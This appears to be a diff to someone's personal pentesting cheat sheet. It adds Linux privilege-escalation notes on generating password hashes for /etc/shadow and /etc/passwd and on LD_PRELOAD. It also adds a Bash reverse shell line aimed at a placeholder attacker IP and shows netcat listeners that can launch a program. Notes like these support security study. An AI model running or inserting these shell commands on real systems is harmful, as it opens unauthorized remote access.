@@ -1,6 +1,19 @@
 # Notes regarding tools/methods/etc
 
 
+## Linux misc
+- mkpasswd - Generate password (for /etc/shadow for example)
+  - Example: mkpasswd -m sha-512 \<password>
+- openssl passwd \<password> - Generate password (for /etc/passwd in this example)
+- Env vars:
+  - LD_PRELOAD - loads a shared object before any others when a program is run. 
+  - LD_LIBRARY_PATH - provides a list of directories where shared libraries are searched for first
+- Bash rev shell:
+  - #!/bin/bash
+  - bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
+- Bash:
+  - Version < 4.2-048 - possible to create functions with names like paths
+
 ## Nmap
 - syntax: namp [options] ip
 ### options
@@ -86,9 +99,9 @@
 - Trace library functions  
  
 ## Nc 
-- Nc -lvp port (listen on port) 
-- Nc -lvp port -e /program (listen on port and lauch program at connection) 
-- Nc addr port  (connect to port) 
+- nc -lvp port (listen on port) 
+- nc -lvp port -e /program (listen on port and lauch program at connection) 
+- nc addr port  (connect to port) 
  
 ## Symlinks 
 - Ln -s file sym (create soft symbolic link) 
@@ -148,3 +161,4 @@ Protocol for sharing resources (files, printers, etc)
 ### Common flaws
 1 - Default credentials
 2 - Samba server (usually insecure)
+
